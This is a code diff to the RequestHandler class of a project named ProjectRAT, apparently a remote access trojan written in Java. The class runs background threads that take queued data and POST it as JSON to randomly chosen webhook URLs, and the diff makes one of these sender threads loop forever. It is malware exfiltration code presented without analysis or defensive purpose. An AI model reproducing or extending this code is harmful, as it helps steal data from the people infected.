@@ -22,15 +22,15 @@ public class RequestHandler {
     private final Queue<Object> stringQueue = new ArrayDeque<>();
 
     public RequestHandler()  {
-
         String[] w = ProjectRAT.webhook;
 
         new Thread(() -> {
             while (true) {
                 try {
                     int randomInt = new Random().nextInt(w.length);
+                    if(queue.isEmpty())
+                        continue;
 
-                    if(queue.isEmpty()) continue;
                     Thread.sleep(2000);
                     Request item = (Request) queue.poll();
 
@@ -90,30 +90,31 @@ public class RequestHandler {
                 }catch (Exception e) {
                     e.printStackTrace();
                 }
-            }
+           }
         }).start();
 
         new Thread(() -> {
-            try {
-                int randomInt = new Random().nextInt(w.length);
-                Object queueItem = stringQueue.poll();
-                CloseableHttpClient client = HttpClientBuilder.create().build();
-                if (queueItem instanceof String) {
-                    HttpPost request = new HttpPost(w[randomInt]);
-                    JSONObject json = new JSONObject();
+            while (true) {
+                try {
+                    int randomInt = new Random().nextInt(w.length);
+                    Object queueItem = stringQueue.poll();
+                    CloseableHttpClient client = HttpClientBuilder.create().build();
+                    if (queueItem instanceof String) {
+                        HttpPost request = new HttpPost(w[randomInt]);
+                        JSONObject json = new JSONObject();
 
-                    json.put("title", queueItem.getClass().getSimpleName());
-                    json.put("content", String.format("```%s```", queueItem));
-                    StringEntity options = new StringEntity(json.toJSONString(), ContentType.APPLICATION_JSON);
-                    request.setEntity(options);
-                    HttpResponse response = client.execute(request);
-                    System.out.println(response);
+                        json.put("title", queueItem.getClass().getSimpleName());
+                        json.put("content", String.format("```%s```", queueItem));
+                        StringEntity options = new StringEntity(json.toJSONString(), ContentType.APPLICATION_JSON);
+                        request.setEntity(options);
+                        HttpResponse response = client.execute(request);
+                        System.out.println(response);
+                    }
+                    client.close();
+                } catch (Exception e) {
+                    e.printStackTrace();
                 }
-                client.close();
-            }catch (Exception e){
-                e.printStackTrace();
             }
-
         }).start();
     }
 
